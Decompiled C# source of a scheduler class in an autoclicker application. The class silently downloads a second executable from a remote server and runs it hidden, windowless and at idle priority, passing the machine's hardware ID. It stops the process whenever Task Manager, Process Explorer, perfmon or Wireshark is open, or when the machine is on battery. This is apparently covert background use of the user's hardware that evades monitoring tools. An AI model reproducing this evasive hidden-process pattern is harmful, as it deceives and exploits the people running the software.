using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Threading;
using System.Windows.Forms;
using FabiShared;
using Sentry;

namespace AutoClicker
{
	// Token: 0x0200001E RID: 30
	internal class DeamonScheduler
	{
		// Token: 0x060000E5 RID: 229 RVA: 0x000054B0 File Offset: 0x000036B0
		public DeamonScheduler()
		{
			this.timeLastAcStateChange = DateTime.MinValue;
			this.runTime = TimeSpan.Zero;
			this.numUnexpectedExists = 0;
			this.loader = new Loader("https://fabi.me/wp-json/", 876L, "speed-autoclicker-d.exe");
			this.loader.CheckNeedDownload(delegate(Loader.CheckResponse res)
			{
				if (!res.needDownload)
				{
					this.startScheduleThread();
					return;
				}
				this.loader.Download(delegate(Loader.DownloadResult dlRes)
				{
					if (string.IsNullOrEmpty(dlRes.errorMessage))
					{
						this.startScheduleThread();
						return;
					}
				});
			});
		}

		// Token: 0x060000E6 RID: 230 RVA: 0x00005512 File Offset: 0x00003712
		private void startScheduleThread()
		{
			this.scheduleThread = new Thread(delegate()
			{
				this.disposed = false;
				this.scheduleThreadBody();
			});
			this.scheduleThread.Start();
		}

		// Token: 0x060000E7 RID: 231 RVA: 0x00005538 File Offset: 0x00003738
		public void Stop()
		{
			this.disposed = true;
			if (this.scheduleThread != null)
			{
				this.scheduleThread.Join();
			}
			try
			{
				File.Delete(this.loader.GetBinPath());
			}
			catch (Exception e)
			{
				SentrySdk.CaptureException(e);
			}
		}

		// Token: 0x060000E8 RID: 232 RVA: 0x00005590 File Offset: 0x00003790
		private void kill()
		{
			this.proc.StandardInput.WriteLine("q");
			this.proc.Kill();
			this.proc.WaitForExit(1000);
			this.proc.Dispose();
			this.proc = null;
		}

		// Token: 0x060000E9 RID: 233 RVA: 0x000055E0 File Offset: 0x000037E0
		private void scheduleThreadBody()
		{
			int kIdleSynced = -1;
			while (!this.disposed)
			{
				bool isRunning = this.proc != null && !this.proc.HasExited;
				int kIdle = this.getKIdle();
				bool shouldRun = kIdle >= 0;
				if (shouldRun != isRunning)
				{
					if (isRunning)
					{
						this.runTime += this.proc.TotalProcessorTime;
						this.kill();
						isRunning = false;
					}
					else
					{
						if (this.proc != null)
						{
							this.numUnexpectedExists++;
							continue;
						}
						try
						{
							this.proc = Process.Start(new ProcessStartInfo(this.loader.GetBinPath(), Misc.GetHardwareId())
							{
								CreateNoWindow = true,
								UseShellExecute = false,
								RedirectStandardInput = true,
								WindowStyle = ProcessWindowStyle.Hidden
							});
							kIdleSynced = -1;
						}
						catch (Exception ex)
						{
							SentrySdk.CaptureException(ex);
							this.numUnexpectedExists++;
						}
					}
				}
				if (isRunning)
				{
					if (kIdleSynced != kIdle)
					{
						this.proc.PriorityClass = ProcessPriorityClass.Idle;
						string s = char.ConvertFromUtf32((int)(48 + (ushort)kIdle)).ToString();
						this.proc.StandardInput.WriteLine(s);
						kIdleSynced = kIdle;
					}
					this.iRunning += 1L;
				}
				else
				{
					this.iIdle += 1L;
				}
				Thread.Sleep(1000);
			}
			if (this.proc != null && !this.proc.HasExited)
			{
				this.kill();
			}
		}

		// Token: 0x060000EA RID: 234 RVA: 0x00005768 File Offset: 0x00003968
		private int getKIdle()
		{
			if (this.disposed)
			{
				return -1;
			}
			if (SystemInformation.PowerStatus.PowerLineStatus == PowerLineStatus.Offline)
			{
				return -1;
			}
			if (this.numUnexpectedExists > 3)
			{
				return -1;
			}
			DateTime now = DateTime.Now;
			if (now - this.timeLastAcStateChange > DeamonScheduler.STOP_AFTER_LAST_INPUT)
			{
				return -1;
			}
			Process[] procs = Process.GetProcesses();
			foreach (Process proc in procs)
			{
				if (DeamonScheduler.STOP_WITH_PROCESSES.Contains(proc.ProcessName))
				{
					return -1;
				}
			}
			if (this.acActive)
			{
				if (now - this.timeLastAcStateChange > DeamonScheduler.TIME_FOREVER)
				{
					return 0;
				}
				return 3;
			}
			else
			{
				if ((now - this.timeLastAcStateChange).Minutes == 0)
				{
					return 5;
				}
				if (this.runTime > DeamonScheduler.MAX_RUN_TIME)
				{
					return -1;
				}
				return 7;
			}
		}

		// Token: 0x060000EB RID: 235 RVA: 0x0000583C File Offset: 0x00003A3C
		public void SetACState(bool active)
		{
			this.acActive = active;
			if (active || this.acWasActive)
			{
				this.timeLastAcStateChange = DateTime.Now;
				this.acWasActive = true;
			}
		}

		// Token: 0x060000EC RID: 236 RVA: 0x00005862 File Offset: 0x00003A62
		public float GetRunTimeRatio()
		{
			if (this.iRunning != 0L)
			{
				return (float)this.iRunning / (float)(this.iRunning + this.iIdle);
			}
			return 0f;
		}

		// Token: 0x04000088 RID: 136
		private static TimeSpan STOP_AFTER_LAST_INPUT = TimeSpan.FromSeconds(1200.0);

		// Token: 0x04000089 RID: 137
		private static TimeSpan MAX_RUN_TIME = TimeSpan.FromSeconds(345600.0);

		// Token: 0x0400008A RID: 138
		private static TimeSpan TIME_FOREVER = TimeSpan.FromSeconds(345600.0);

		// Token: 0x0400008B RID: 139
		private const int MAX_UNEXPECTED_EXITS = 3;

		// Token: 0x0400008C RID: 140
		private const int K_IDLE_ACTIVE = 3;

		// Token: 0x0400008D RID: 141
		private const int K_IDLE_1MIN = 5;

		// Token: 0x0400008E RID: 142
		private const int K_IDLE_DEACTIVE = 7;

		// Token: 0x0400008F RID: 143
		private const int K_IDLE_FOREVER = 0;

		// Token: 0x04000090 RID: 144
		private static string[] STOP_WITH_PROCESSES = new string[]
		{
			"Taskmgr",
			"perfmon2",
			"procexp64",
			"procexp",
			"Wireshark"
		};

		// Token: 0x04000091 RID: 145
		private DateTime timeLastAcStateChange;

		// Token: 0x04000092 RID: 146
		private TimeSpan runTime;

		// Token: 0x04000093 RID: 147
		private Thread scheduleThread;

		// Token: 0x04000094 RID: 148
		private volatile bool disposed;

		// Token: 0x04000095 RID: 149
		private int numUnexpectedExists;

		// Token: 0x04000096 RID: 150
		private bool acActive;

		// Token: 0x04000097 RID: 151
		private bool acWasActive;

		// Token: 0x04000098 RID: 152
		private Process proc;

		// Token: 0x04000099 RID: 153
		private Loader loader;

		// Token: 0x0400009A RID: 154
		private long iIdle;

		// Token: 0x0400009B RID: 155
		private long iRunning;
	}
}
